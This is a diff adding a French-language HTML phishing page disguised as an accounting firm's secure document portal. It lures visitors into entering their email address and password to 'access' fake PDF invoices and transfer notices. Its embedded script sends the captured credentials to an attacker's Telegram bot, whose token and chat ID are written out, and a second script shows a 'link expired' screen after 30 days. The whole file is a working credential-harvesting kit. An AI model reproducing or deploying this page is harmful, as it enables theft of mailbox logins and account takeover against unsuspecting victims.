@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cabinet d'expertise comptable</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="top-header">
+        <h1>Cabinet d'expertise comptable</h1>
+        <nav>
+            <ul>
+                <li><a href="#">Accueil</a></li>
+                <li><a href="#">Nos Services</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section class="banner">
+        <div class="overlay">
+            <h2>Bienvenue chez Cabinet d'expertise comptable</h2>
+            <p>Votre partenaire de confiance pour une gestion financière efficace et transparente.</p>
+        </div>
+    </section>
+
+    <section class="documents">
+        <p><strong>Vous avez reçu un fichier sécurisé :</strong></p>
+        <p><a href="#">Devis.PDF</a></p>
+        <p><a href="#">Avis-Virement.PDF</a></p>
+        <p><strong>Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.</strong></p>
+    </section>
+
+    <section class="form-section">
+        <form METHOD="post" action="">
+            <label>Entrez votre E-mail <span>(obligatoire)</span></label>
+            <input type="email" name="email" required>
+            <label>Mot de Passe <span>(obligatoire)</span></label>
+            <input type="password" name="pass" required>
+            <button type="submit">ACCÉDER AUX FICHIERS</button>
+        </form>
+    </section>
+
+    <section class="expertise">
+        <img src="img2.png" alt="Expertise reconnue">
+        <div>
+            <h2>Expertise reconnue</h2>
+            <p>Notre équipe d'experts-comptables est hautement qualifiée et régulièrement formée pour répondre aux exigences légales et fiscales.</p>
+        </div>
+    </section>
+
+    <section class="services-header">
+        <h2>Des services adaptés à vos besoins</h2>
+        <p>Découvrez notre gamme complète de services comptables et fiscaux.</p>
+    </section>
+
+    <section class="services">
+        <div class="service">
+            <img src="img3_1.png" alt="Comptabilité générale">
+            <h3>Comptabilité générale</h3>
+            <p>Nous gérons votre comptabilité avec précision, vous permettant de vous concentrer sur votre activité principale.</p>
+        </div>
+        <div class="service">
+            <img src="img3_2.png" alt="Conseil fiscal">
+            <h3>Conseil fiscal</h3>
+            <p>Nos experts vous accompagnent pour optimiser votre fiscalité et respecter les obligations légales.</p>
+        </div>
+    </section>
+<script>
+document.querySelector("form").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const email = document.querySelector('input[type="email"]').value;
+    const password = document.querySelector('input[type="password"]').value;
+
+    const token = "7951598405:AAFeubBymDuNfnDkRlMn08M_Ecl6DpOLoXo"; // 🔁 Remplacez par votre bot token
+    const chat_id = "1379993687"; // 🔁 Remplacez par votre chat ID
+    const message = `🔐 Mails Pros Comptable:\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: message,
+        }),
+    })
+    .then(() => {
+        // Redirection après l’envoi
+        window.location.href = "fin.html";
+    })
+    .catch((error) => {
+        console.error("Erreur lors de l'envoi Telegram :", error);
+        window.location.href = "fin.html";
+    });
+});
+</script>
+<script>
+// Date de début : 8 juin 2025
+const startDate = new Date('2025-06-20T00:00:00');
+
+// Délai d’expiration en jours
+const expirationDays = 30;
+
+// Vérifie si le lien a expiré
+function isLinkExpired() {
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+// Affiche un message d’expiration avec style percutant
+function showExpirationMessage() {
+  if (isLinkExpired()) {
+    // Supprimer tout le contenu de la page
+    document.body.innerHTML = '';
+
+    // Créer le conteneur du message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = `
+      <h1>⚠️ Le lien a expiré</h1>
+      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+    `;
+
+    // Style impactant
+    Object.assign(messageDiv.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100vw',
+      height: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      justifyContent: 'center',
+      alignItems: 'center',
+      backgroundColor: '#1a1a1a',
+      color: '#ff4d4f',
+      fontFamily: 'Segoe UI, Arial, sans-serif',
+      fontSize: '24px',
+      textAlign: 'center',
+      padding: '40px',
+      boxSizing: 'border-box',
+      zIndex: '9999',
+    });
+
+    // Style du titre
+    messageDiv.querySelector('h1').style.fontSize = '36px';
+    messageDiv.querySelector('h1').style.marginBottom = '20px';
+    messageDiv.querySelector('p').style.color = '#ffffff';
+
+    // Afficher sur la page
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Lancer au chargement de la page
+window.onload = showExpirationMessage;
+</script>
+</body>
+</html>
